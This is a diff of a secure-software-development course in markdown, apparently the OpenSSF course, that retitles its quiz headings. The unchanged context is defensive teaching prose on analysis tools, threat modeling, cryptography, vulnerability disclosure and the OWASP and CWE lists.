 🔔 Improper information exposure is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #20 and 2019 CWE Top 25 #4. It is identified as [CWE-200](https://cwe.mitre.org/data/definitions/200.html), *Exposure of Sensitive Information to an Unauthorized Actor* (aka *Information Exposure*).
 
-### Quiz 4.11
+#### Quiz 4.11: Minimize Feedback / Information Exposure
 
 \>\>If an untrusted user connects into your system over a network, and a request fails, you should provide them with a detailed stack trace. True or False?<<
 
@@ -3739,7 +3739,7 @@ Some tools are OSS, while others are proprietary. Some of the proprietary tools 
 
 So let’s look at some kinds of tools you can use to help make your software secure.
 
-### Quiz 1.1
+#### Quiz 1.1: Verification Overview
 
 \>\>When using tools to look for security vulnerabilities, there is normally a risk of “false negatives” - that is, failing to report vulnerabilities even when they are present and the tool is designed to find that kind of vulnerability. True or False?<<
 
@@ -3811,7 +3811,7 @@ There are many other kinds of static analysis tools.
 
 One kind is so important that we will dedicate a whole separate section to it. The kind of analysis these tools do has a variety of names, including software composition analysis (SCA), dependency analysis, and origin analysis. No matter what it is called, it is important, so we will discuss that next.
 
-### Quiz 1.2
+#### Quiz 1.2: Static Analysis Overview
 
 \>\>Security code scanners/static application security testing (SAST) tools examine code to look for vulnerabilities. They can be very useful, but such a tool could report no vulnerabilities even on software with vulnerabilities. True or False?<<
 
@@ -3873,7 +3873,7 @@ There are lots of SCAs available. If you use GitHub or GitLab, they provide some
 
 The key is that most software reuses other software, and that vulnerabilities will occasionally be found in that reused software.
 
-### Quiz 1.3
+#### Quiz 1.3: Software Composition Analysis (SCA)/Dependency Analysis
 
 \>\>Select all the true statement(s) about handling dependencies:<<
 
@@ -3949,7 +3949,7 @@ In short: these coverage measures can be useful for warning about some problems,
 
 But there is more to dynamic analysis when you are interested in security. Let’s next look at fuzz testing.
 
-### Quiz 1.4
+#### Quiz 1.4: Dynamic Analysis Overview
 
 \>\>Select the true statement(s) about dynamic analysis including testing:<<
 
@@ -4003,7 +4003,7 @@ If you manage an OSS project, you might consider participating in [Google’s OS
 
 There are a huge number of fuzzers, and things are changing all the time. The first step is to know that there is a tool that might be useful. However, if what you have developed is a web application, there is a tool specifically designed for that situation that typically embeds a fuzzer within it, called a *web application scanner*. We will discuss that in the next unit.
 
-### Quiz 1.5
+#### Quiz 1.5: Fuzz Testing
 
 \>\>Select the true statement(s) about fuzzing:<<
 
@@ -4045,7 +4045,7 @@ The term Dynamic Application Security Testing, or DAST, is often seen in literat
 
 In this course we have intentionally used more specific terms instead of DAST, in the hopes of making things clearer. The point, regardless of the terminology, is to use approaches (including tools) to find and fix vulnerabilities before the attackers exploit them.
 
-### Quiz 1.6
+#### Quiz 1.6: Web Application Scanners
 
 \>\>A web application scanner (WAS) executes at runtime; it repeatedly sends data to a web application in an attempt to trigger and then detect problems. True or False?<<
 
@@ -4073,7 +4073,7 @@ The Open Source Security Foundation (OpenSSF) Best Practices badge identifies a 
 
 If you are using OSS, consider preferring OSS who have earned a badge. If you are developing OSS, you should strongly consider working to earn an Open Source Security Foundation (OpenSSF) Best Practices badge. By implementing these best practices you will increase the likelihood of developing higher-quality and more secure software. To learn more and get started, check out the [OpenSSF Best Practices Badge Program](https://bestpractices.coreinfrastructure.org/en).
 
-### Quiz 1.7
+#### Quiz 1.7: Combining Verification Approaches
 
 \>\>Select the true statement(s):<<
 
@@ -4119,7 +4119,7 @@ A related problem is how to do this kind of analysis. Some people create a set o
 
 For our purposes, we will focus in the next unit on a very simple approach called STRIDE.
 
-### Quiz 2.1
+#### Quiz 2.1: Introduction to Threat Modeling
 
 \>\>Select the true statement(s):<<
 
@@ -4183,7 +4183,7 @@ Threat modeling may be overkill if you do not have significant security threats,
 
 🔔 Failing to apply threat modeling is considered part of 2021 OWASP Top 10 #4, insecure design.
 
-### Quiz 2.2
+#### Quiz 2.2: STRIDE
 
 \>\>Select the true statement(s):<<
 
@@ -4291,7 +4291,7 @@ Historically the *Cipher block chaining* (CBC) mode was used, but this must be c
 
 A common mode used today is the Galois/Counter Mode (GCM). It is fast, parallelizable, and adds an authentication code so it can easily detect if the wrong key is used. It is a good mode to use. There are other good modes as well; the important thing is to choose a mode wisely, and in particular, to *never* use ECB mode in production systems.
 
-### Quiz 3.1
+#### Quiz 3.1: Symmetric/Shared Key Encryption Algorithms
 
 \>\>Select the true statement(s):<<
 
@@ -4327,7 +4327,7 @@ As of this writing, there is an effort to update git so it will support a differ
 
 This may be resolved in git by the time you read this. However, the main point is to learn from this mistake. As noted earlier, cryptographic systems (such as algorithms and protocols) *are* occasionally broken, so you must be prepared to replace them.
 
-### Quiz 3.2
+#### Quiz 3.2: Cryptographic Hashes (Digital Fingerprints)
 
 \>\>Select the true statement(s):<<
 
@@ -4361,7 +4361,7 @@ There are also a variety of key exchange algorithms. The oldest is the Diffie-He
 
 As hinted at earlier, it is critical that you use existing well-respected implementations (don’t implement it yourself), and check any parameters you choose carefully. Perhaps the most important is the key length for that algorithm (as noted earlier, elliptic curve algorithms have equivalent strength with shorter keys). A useful source for recommended key lengths is [NIST’s *Recommendation for Key Management: Part 1 - General*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf).
 
-### Quiz 3.3
+#### Quiz 3.3: Public-Key (Asymmetric) Cryptography
 
 \>\>Select the true statement(s):<<
 
@@ -4461,7 +4461,7 @@ as rejection sampling,
 However, you should normally just use the CSPRNG library function
 that provides this function.
 
-### Quiz 3.4
+#### Quiz 3.4: Cryptographically Secure Pseudo-Random Number Generator (CSPRNG)
 
 \>\>Select the true statement(s):<<
 
@@ -4505,7 +4505,7 @@ You should allow users to require the use of two-factor authentication (2FA), ei
 
 Also, beware of implementing these algorithms only on the client side. It is fine to implement them on the client side (because that prevents the server from ever discovering the password the user enters), as long as they are *also* implemented on the server. The danger is doing them *only* on the client; if that happens, then what is stored in the server is no different from storing passwords in the clear. Once attackers get the password database, they can simply create or modify their own client to log into anyone’s account.
 
-### Quiz 3.5
+#### Quiz 3.5: Storing Passwords
 
 \>\>Select the true statement(s):<<
 
@@ -4549,7 +4549,7 @@ You will notice that any configuration has a list of TLS ciphersuites in order o
 
 Once you have deployed your system, you should test it. If the site is publicly visible, it is a great idea to use the free Qualys test called the [SSL Server Test](https://www.ssllabs.com/ssltest/). It is called the SSL Server Test because that is the old name for TLS, but don’t be fooled, it works well with TLS (and will complain if you allow the vulnerable SSL protocols).
 
-### Quiz 3.6
+#### Quiz 3.6: Transport Layer Security (TLS)
 
 \>\>Select the true statement(s):<<
 
@@ -4603,7 +4603,7 @@ You should instead have a plan for handling when (not if) your cryptographic alg
 
 Similarly, seek advice from experts, and weigh that advice carefully. Errors in cryptographic systems can be devastating, and can last for many years because they are not obvious. Getting others’ review and constructive feedback is generally a good idea, but it is especially important when using cryptography.
 
-### Quiz 3.7
+#### Quiz 3.7: Other Topics in Cryptography
 
 \>\>Select the true statement(s):<<
 
@@ -4777,7 +4777,7 @@ Ensure that it is easy to automatically update to the fixed version of the softw
 
 Be sure to always credit and thank vulnerability reporters, unless they request otherwise. It is rude to not provide credit, and many vulnerability reporters provide reports *primarily* to get credit. What is worse, reporters may be less cooperative in the future if they do not receive appropriate credit.
 
-### Quiz 4.1
+#### Quiz 4.1: Respond To and Fix the Vulnerability in a Timely Way
 
 \>\>What is the meaning of **TLP:RED**?<<
 
@@ -4873,7 +4873,7 @@ When do you end? The usual answer is when the stakeholders agree that it is enou
 
 What is great about an assurance case is that if someone later wants to know “is this software adequately secure”, they can simply review the assurance case. Simply *having* an assurance case provides a lot of confidence, because it shows that someone thought through what the system is supposed to do and has a reasonable argument (with evidence) that the claims are correct.
 
-### Quiz 4.2
+#### Quiz 4.2: Assurance Cases
 
 \>\>Select the true statement(s):<<
 
@@ -4975,7 +4975,7 @@ When disposing, make sure you fully destroy any data you are supposed to destroy
 
 🔔 Security misconfiguration is such a common mistake in web applications that it is 2017 OWASP Top 10 #6 and 2021 OWASP Top 10 #5.  Protecting automatic update functionality is considered part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*. Using components with known vulnerabilities is such a common web application vulnerability that it is 2017 OWASP Top 10 #9. Using vulnerable and outdated components is 2021 OWASP Top 10 #6. *Security Logging and Monitoring Failures* is 2021 OWASP Top 10 #9. *Insufficient logging and monitoring* is 2017 OWASP Top 10 #10.
 
-### Quiz 4.3
+#### Quiz 4.3: Distributing, Fielding/Deploying, Operations, and Disposal
 
 \>\>Select the true statement(s):<<
 
@@ -5262,7 +5262,7 @@ There are some systems that can combine these tools. For example:
 
 Today formal methods are only used in special circumstances, but they might become more prominent in the future. Our goal has been to simply make you aware of it, in case you decide that it might be worth pursuing further in the future. You cannot consider using an approach if you have never heard of it.
 
-### Quiz 4.4
+#### Quiz 4.4: Formal Methods
 
 \>\>Select the true statement(s):<<
 
@@ -5300,7 +5300,7 @@ Here is the [*OWASP Top 10*](https://owasp.org/Top10/) (2021 edition) list of ca
 
 In this course we have covered all of the OWASP Top 10, in both the [2017](https://owasp.org/www-project-top-ten/2017/Top_10) and [2021](https://owasp.org/Top10/) editions, and included cross-references when we did.
 
-### Quiz 4.5
+#### Quiz 4.5: OWASP Top 10
 
 \>\>Select the true statement(s):<<
 
@@ -5546,7 +5546,7 @@ You will be glad to know that this set of courses has, at least briefly, discuss
 for both the [2019](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html) and [2021](https://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html) editions of the CWE Top 25 list.
 
 
-### Quiz 4.6
+#### Quiz 4.6: CWE Top 25
 
 \>\>Select the true statement(s):<<
 
